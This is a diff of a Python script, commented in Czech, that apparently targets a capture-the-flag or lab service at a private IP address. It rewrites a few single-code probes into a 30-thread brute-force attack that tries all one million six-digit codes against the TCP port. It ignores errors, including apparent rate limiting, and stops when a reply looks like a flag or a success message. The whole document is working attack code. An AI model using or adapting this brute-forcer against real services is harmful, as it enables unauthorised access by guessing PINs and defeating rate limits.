@@ -1,9 +1,18 @@
 import socket
+import time
+import threading
+from concurrent.futures import ThreadPoolExecutor
 
 HOST = "192.168.1.96"
 PORT = 54321
+WORKERS = 30  # paralelnich spojeni - kdyz to bude sekat, sniz na 10
 
-def recv_all(sock, timeout=0.5):
+found = threading.Event()
+result = {}
+counter = {"done": 0}
+lock = threading.Lock()
+
+def recv_all(sock, timeout=0.4):
     sock.settimeout(timeout)
     data = b""
     try:
@@ -17,24 +26,48 @@ def recv_all(sock, timeout=0.5):
     return data
 
 def try_code(code):
-    s = socket.socket()
-    s.settimeout(3)
+    if found.is_set():
+        return
     try:
+        s = socket.socket()
+        s.settimeout(3)
         s.connect((HOST, PORT))
-        welcome = recv_all(s, 0.5)
-        print(f"Server posila pri pripojeni: {welcome!r}")
+        recv_all(s, 0.2)  # uvitani
         s.sendall(f"{code:06d}\n".encode())
-        response = recv_all(s, 0.5)
+        resp = recv_all(s, 0.4).decode(errors="ignore")
         s.close()
-        return response.decode(errors="ignore")
+        
+        with lock:
+            counter["done"] += 1
+            if counter["done"] % 500 == 0:
+                print(f"  ...zkouseno {counter['done']} kodu, posledni: {code:06d}")
+        
+        # USPECH = odpoved NEOBSAHUJE "wrong"
+        if "wrong" not in resp.lower() and resp.strip():
+            print(f"\n🎯 MOZNY HIT! kod={code:06d}")
+            print(f"Odpoved: {resp!r}")
+            if "flag" in resp.lower() or "{" in resp or "correct" in resp.lower():
+                result["code"] = code
+                result["resp"] = resp
+                found.set()
     except Exception as e:
-        return f"ERR: {e}"
+        # pri rate-limitu nebo chybe to znova zaradim
+        pass
 
-print("=== test 1: kod 123456 ===")
-print(repr(try_code(123456)))
-print()
-print("=== test 2: kod 000000 ===")
-print(repr(try_code(0)))
-print()
-print("=== test 3: kod 999999 ===")
-print(repr(try_code(999999)))
+start = time.time()
+print(f"Spoustim brute-force, {WORKERS} vlaken...")
+
+with ThreadPoolExecutor(max_workers=WORKERS) as ex:
+    for code in range(1000000):
+        if found.is_set():
+            break
+        ex.submit(try_code, code)
+
+elapsed = time.time() - start
+print(f"\nHotovo za {elapsed:.1f}s ({counter['done']} pokusu)")
+
+if "code" in result:
+    print(f"\n✅ KOD: {result['code']:06d}")
+    print(f"Odpoved serveru:\n{result['resp']}")
+else:
+    print("\n❌ Nenaslo se nic. Mozna je potreba zvysit timeout nebo upravit detekci.")
